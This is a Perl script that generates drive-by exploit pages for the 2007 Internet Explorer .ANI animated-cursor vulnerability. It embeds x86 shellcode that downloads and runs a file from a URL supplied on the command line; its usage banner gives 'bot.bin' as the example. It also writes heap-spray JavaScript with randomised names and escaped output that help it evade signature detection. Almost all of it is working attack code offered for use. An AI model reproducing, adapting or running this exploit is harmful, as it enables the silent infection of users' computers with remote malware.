#!/usr/bin/perl

#--------------------------------------------------------------------------------
# Info: .ANI (RIFF Cursors) 2007 universal exploit generator
# Tested on MS Internet Explorer 6.x-7.x, Windows XP SP2, Windows Vista
# Author: Yag Kohha <skyhole [at] gmail.com>
# 10x`n`Gr33tz 2:
# Jamikazu, Skylined (pretty good t-short on BH07 Europe - L00k like skylined, skylined, skylined)
# H.D. Moor and metasploit project
# Kumar Brothers (tnx for Vista patch live show at BH07 Europe), 
# Alexander Sotirov (tnx for "Heap Feng Shui" live show at BH07 Europe), str0ke
# Microsoft for great coding and Amsterdam (BH07 Europe) party
#--------------------------------------------------------------------------------

my $url_=$ARGV[0];
chomp($url_);

if ($url_ eq "") {
print<<FOOKER;
 ---------------------------------------------------------
 | MS IE .ANI (RIFF Cursors) universal Exploit Generator |
 | Tested on IE 6.x-7.x, XP SP1/SP2, Windows Vista       | 
 | Enter url for download`n`exec as script parameter     |
 | Usage: ./generate_pak http://host/bot.bin             |
 | Get exploit files (cursors B0F file and exploit body) |
 | at ./out folder after running thuis script 		 |
 | ===========> Everybody loves hypnotoad!!! <========== |
 | Coded by Yag Kohha,  mailto: skyhole[at]gmail.com     |
 ---------------------------------------------------------
FOOKER
exit;
 }
       

my $header=generate_wd(12);
my $heapspraytoAddr=generate_wd(8);
my $plcode=generate_wd(20);
my $out=generate_wd(8);
my $heapBlockSz=generate_wd(9);
my $SpSlSz=generate_wd(9);
my $plsize=generate_wd(9);
my $sprsld=generate_wd(9);
my $buffer_name=generate_wd(14);
my $buffer_ext=generate_wd(14);
my $fn_name=generate_wd(11);
my $hpBlks=generate_wd(11);
my $sco = "\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x2E\x2E\x5C\x79\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF$url_\x00";
my $shellcode_morph=generate_wd(0);
$sco =~ s(\x79)($shellcode_morph);
my $war_code= convert_sco($sco);


my @exploit_body=<<FOOKER;
<SCRIPT language="javascript">
	var $heapspraytoAddr = 0x07000000;
	var $plcode = unescape("$war_code");
	var $heapBlockSz = 0x400000;
	var $plsize = $plcode.length * 4;
	var $SpSlSz = $heapBlockSz - ($plsize+0x38);
	var $sprsld = unescape("%u4141%u4141");
	$sprsld = $fn_name($sprsld,$SpSlSz);
	$hpBlks = ($heapspraytoAddr - 0x100000)/$heapBlockSz;
	memory = new Array();
	for (i=0;i<$hpBlks;i++)
	{
		memory[i] = $sprsld + $plcode;
	}
	document.write("<HTML><BODY style=\\"CURSOR: url('$buffer_name.$buffer_ext')\\">    </BODY></HTML>")
	function $fn_name($sprsld, $SpSlSz)
	{
		while ($sprsld.length*2<$SpSlSz)
		{
			$sprsld += $sprsld;
		}
		$sprsld = $sprsld.substring(0,$SpSlSz/2);
		return $sprsld;
	}
</SCRIPT>
FOOKER

open (OUT, ">", "./out/$out.html");
print OUT @exploit_body;
close OUT;

`/bin/cat ./bin/buffer.bin>./out/$buffer_name.$buffer_ext`;
@bang_=`./bin/convert ./out/$out.html`;

open (OUT, ">", "./out/$out.html");
print OUT "<script> document.write(unescape(\"";
print OUT @bang_;
print OUT "\"));</script>";
close OUT;

sub convert_sco {
	my $data = shift;
	my $mode = shift() || 'LE';
	my $code = '';
	
	my $idx = 0;
	
	if (length($data) % 2 != 0) {
		$data .= substr($data, -1, 1);
	}
	
	while ($idx < length($data) - 1) {
		my $c1 = ord(substr($data, $idx, 1));
		my $c2 = ord(substr($data, $idx+1, 1));	
		if ($mode eq 'LE') {
			$code .= sprintf('%%u%.2x%.2x', $c2, $c1);	
		} else {
			$code .= sprintf('%%u%.2x%.2x', $c1, $c2);	
		}
		$idx += 2;
	}
	
	return $code;
}

sub generate_wd() 
{
 my $wdsize = shift;
 my @alphanumeric = ('a'..'z', 'A'..'Z');
 my $wd = join '', 
 map $alphanumeric[rand @alphanumeric], 0..$wdsize;
  return $wd;

}
